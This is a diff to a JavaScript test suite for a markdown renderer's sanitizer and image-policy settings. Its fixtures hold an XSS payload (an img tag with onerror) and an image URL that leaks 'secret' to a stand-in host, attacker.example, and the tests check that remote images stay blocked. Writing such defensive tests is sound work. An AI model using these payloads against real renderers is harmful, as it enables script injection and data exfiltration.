@@ -355,8 +355,19 @@ describe('aparteGlobalConfig', () => {
 
         it('setHtmlSanitizer(null) disables sanitization (trusted content)', () => {
             aparteGlobalConfig.setHtmlSanitizer(null);
+            // The image policy is a rule of its own: with every picture allowed, the trusted
+            // markup comes back as it was written.
+            aparteGlobalConfig.setImagePolicy(['*']);
             aparteGlobalConfig.setMarkdownProvider(() => '<img src=x onerror="alert(1)">');
             expect(aparteGlobalConfig.renderMarkdown('x')).toContain('onerror');
+        });
+
+        it('setHtmlSanitizer(null) keeps the image policy: a remote picture is still held', () => {
+            aparteGlobalConfig.setHtmlSanitizer(null);
+            aparteGlobalConfig.setMarkdownProvider(() => '<p><img src="https://attacker.example/c.png?d=secret" alt="chart"></p>');
+            const out = aparteGlobalConfig.renderMarkdown('x');
+            expect(out).not.toContain('<img');
+            expect(out).toContain('data-aparte-image="https://attacker.example/c.png?d=secret"');
         });
 
         it('setHtmlSanitizer(fn) routes provider output through the custom sanitizer', () => {
